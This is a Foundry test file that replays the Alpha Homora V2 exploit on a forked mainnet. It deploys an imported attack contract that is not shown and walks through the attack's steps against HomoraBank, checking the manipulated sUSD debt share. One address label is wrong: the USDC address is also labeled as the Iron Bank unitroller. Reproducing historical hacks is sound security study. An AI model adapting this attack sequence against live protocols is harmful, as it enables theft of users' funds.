// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../src/AlphaFinanceExploit.sol";

contract AlphaFinanceExploitTest is Test {
    address internal attacker;
    AlphaFinanceExploit attackContract;
    IHomoraBank constant homoraBank =
        IHomoraBank(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb);
    address susdAddr;

    function setUp() public {
        // fork maninnet
        uint256 blocknum = 11846490; // the block Alpha Homora V2 Exploiter created evil spell
        string memory rpc = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpc, blocknum);
        assertEq(block.number, blocknum);

        attacker = makeAddr("attacker");
        vm.deal(attacker, 9.94264 ether); // the Exploiter's balance
        susdAddr = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
        vm.label(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
            "uniswapV2Router02"
        );
        vm.label(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, "uni");
        vm.label(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, "usdc");
        vm.label(0x57Ab1ec28D129707052df4dF418D58a2D46d5f51, "susd");
        vm.label(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, "weth");
        vm.label(
            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
            "ironBankUnitroller"
        );
        vm.label(0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8, "cySusd");
        vm.label(0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb, "homoraBank");
        vm.label(0xd3d2E2692501A5c9Ca623199D38826e513033a17, "uniPairLPToken");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        vm.startPrank(attacker, attacker);
        // step1 deploy contract
        attackContract = new AlphaFinanceExploit();

        // step2
        vm.roll(11846579);
        attackContract.step2{value: 1.5 ether}();

        // step3
        vm.roll(11846605);
        bytes memory data = abi.encodeCall(AlphaFinanceExploit.step3, ());
        uint256 posId = homoraBank.execute(0, address(attackContract), data);

        // step4
        vm.roll(11846608);
        data = abi.encodeCall(AlphaFinanceExploit.step4, ());
        homoraBank.execute(posId, address(attackContract), data);
        assertEq(1, homoraBank.getPositionDebtShareOf(posId, susdAddr)); // susd debtshare

        // step5
        vm.roll(11846612);
        homoraBank.resolveReserve(susdAddr);
        (, , , uint totalDebt, ) = homoraBank.getBankInfo(susdAddr);
        assertGt(totalDebt, 1);
        console.log("totalDebt = %s", totalDebt);

        // step 6
        vm.roll(11846618);
        data = abi.encodeCall(AlphaFinanceExploit.step6, (16));
        // new positon but same contract
        uint256 posId2 = homoraBank.execute(0, address(attackContract), data);

        vm.stopPrank();

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n\n You successfully reporduced the attack\n\n");
    }

    function validation() internal {}
}
